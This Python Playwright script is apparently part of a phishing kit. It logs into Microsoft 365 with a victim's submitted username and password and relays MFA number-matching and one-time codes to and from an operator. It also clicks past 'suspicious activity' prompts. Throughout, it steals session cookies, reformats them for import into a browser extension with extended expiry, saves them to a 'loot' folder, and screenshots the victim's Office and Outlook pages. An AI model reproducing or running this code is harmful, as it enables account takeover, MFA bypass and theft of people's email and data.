import re
from playwright.sync_api import Playwright, sync_playwright, expect
import time
import json
import os 
import pickle

try:
    import sys

    sys.path.insert(0, "..")
    from utils import messageAdmin, DEBUG
except:
    pass
try:
    import sys

    sys.path.insert(0, "..")
    import test
except:
    pass

# def send_message(self, msg,type="slack", data=""):
#         # print(f"[+] current Stat: {msg} : {data}")
#         self.return_json = json.dumps({"id": self.id, "msg": msg, "data": data})
#         messageAdmin(
#             f"------------- ID: {self.id}\n {self.return_json} \n -----------------"
#         )
#         self.q.put(self.return_json)
class auto_login:
    def __init__(self, q, id, username, password):
        print("[+] starting")
        self.username = username
        self.password = password
        self.q = q
        self.id = id
        self.loot_location = (
            "./loot/" + "".join(i for i in username if i.isalpha()) + "_" + id
        )
        self.OTP_type = None
        self.OTP = None
        self.cookie = None
        if not os.path.exists(self.loot_location):
            os.makedirs(self.loot_location)
    
    def send_message(self, msg,type="noti", data=""):
        
        curr_msg = json.dumps({"id": self.id,"username":self.username, "type":type ,"msg": msg, "data": data})
        print(curr_msg)
        self.q.put(curr_msg)

    def fix_cookie(self,cookie):
        final_lst = []
        Cookie_editor_json_template = {
            "path": "",
            "domain": "",
            "expirationDate": 1,
            "value": "",
            "name": "",
            "httpOnly": False,
            "hostOnly": False,
            "secure": False,
        }
        for line in cookie:
            Cookie_editor_json = dict(Cookie_editor_json_template)
            Cookie_editor_json["path"] = line["path"]
            Cookie_editor_json["domain"] = line["domain"]
            Cookie_editor_json["expirationDate"] = int(time.time()) + (60*60*24*30)
            Cookie_editor_json["name"] = line["name"]
            Cookie_editor_json["httpOnly"] = line["httpOnly"]
            Cookie_editor_json["value"] = line["value"]
            Cookie_editor_json["secure"] = False
        
            if Cookie_editor_json["name"].startswith("__Host") or Cookie_editor_json["name"].startswith("__Secure-"):
                Cookie_editor_json["secure"] = True
            
            if Cookie_editor_json["domain"][0] == ".":
                Cookie_editor_json["hostOnly"] = False
                Cookie_editor_json["domain"] = Cookie_editor_json["domain"][1:]
            else:
                Cookie_editor_json["hostOnly"] = True
            
            if Cookie_editor_json["path"] == "":
                Cookie_editor_json["path"] = "/"

            final_lst.append(Cookie_editor_json)
        
        return json.dumps(final_lst)

    def run(self,playwright: Playwright) -> None:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        page.goto("https://www.office.com/login")
        page.get_by_placeholder("Email, phone, or Skype").click()
        page.get_by_placeholder("Email, phone, or Skype").fill(self.username)
        page.get_by_role("button", name="Next").click()
        page.wait_for_timeout(3000)
        if "We couldn't find an account with that username" in page.content() or "This username may be incorrect" in page.content():
            self.send_message("Invalid username")
            return

        page.get_by_placeholder("Password").click()
        page.get_by_placeholder("Password").fill(self.password)
        page.get_by_role("button", name="Sign in").click()
        page.wait_for_timeout(3000)
        if "password is incorrect" in page.content():
            self.send_message("Invalid password")
            return

        self.send_message("valid creds")
        
        # check if OTP present:
        
        # if "Open your Authenticator app, and enter the number shown to sign in" in page.content():
        #     # Get the OTP
        #     self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
        #     self.send_message(msg="OTP_code", data=self.OTP)
            
            # Waiting for an action to happen
        while True:
            time.sleep(1)
            while True:
                # Yes this is the best solution that i con think of for this error :) 
                # Page.content: Unable to retrieve content because the page is navigating and changing the content.
                try:
                    page_content = page.content()
                    break
                except:
                    pass
            if "Stay signed in?" in page_content:
                # an extra wait to for the button to become clickable
                time.sleep(2) 
                page.locator("#idSIButton9").click()
                self.send_message("OTP_submited_stay_signedin_clicked")
                break
            if "We didn't hear from you" in page_content:
                self.send_message("OTP_timeout")
                return
            if "Welcome to Microsoft 365" in page_content:
                self.send_message("OTP_submited")
                break
            if "Suspicious activity detected" in page_content:
                time.sleep(2)
                self.send_message("Suspicious_activity_detected")
                page.locator("#idSIButton9").click()
                # continue
            if "Verify your identity" in page_content:
                self.send_message("Suspicious_activity_detected")
                page.locator('//*[@id="idDiv_SAOTCS_Proofs"]/div[2]/div').click()
            if "Open your Authenticator app, and enter the number shown to sign in" in page.content():
                # Get the OTP
                self.OTP = page.locator("#idRichContext_DisplaySign").text_content()
                self.send_message(msg="OTP_code", data=self.OTP)
            if "Enter the code displayed in the Microsoft" in page_content:
                self.send_message(msg="OTP2_code")
                time.sleep(3)
                
                curr_otp = self.q.get()
                page.get_by_placeholder("Code").click()
                page.get_by_placeholder("Code").fill(curr_otp)
                page.get_by_role("button", name="Verify").click()
                    

        # --------------------- Cookies
        self.send_message("Getting cookies")
        self.cookie = self.fix_cookie(context.cookies())
        print(self.cookie)
        self.send_message(msg="cookies",type="internal",data=self.cookie)
        with open(f"{self.loot_location}/cookies.json", "wb") as f:
            f.write(self.cookie.encode())

        # --------------------- Screenshots
        page.wait_for_timeout(15000)
        self.send_message("screenshotting office")
        page.screenshot(path=f"{self.loot_location}/office.png")

        self.send_message("screenshotting outlook")
        page.goto("https://outlook.office.com.mcas.ms/mail/")
        page.wait_for_timeout(5000)
        if "Access to Microsoft Exchange Online is monitored" in page.content():
            page.locator("#hiddenformSubmitBtn").click()
        page.wait_for_timeout(15000)
        page.screenshot(path=f"{self.loot_location}/outlook.png")


        page.wait_for_timeout(40000)

        # ---------------------
        context.close()
        browser.close()

    def start_the_action(self):
        self.send_message("Starting the bot")
        with sync_playwright() as playwright:
            self.run(playwright)


if __name__ == "__main__":
    obj = auto_login(1,"1","a@test.com","bbb")
    obj.start_the_action()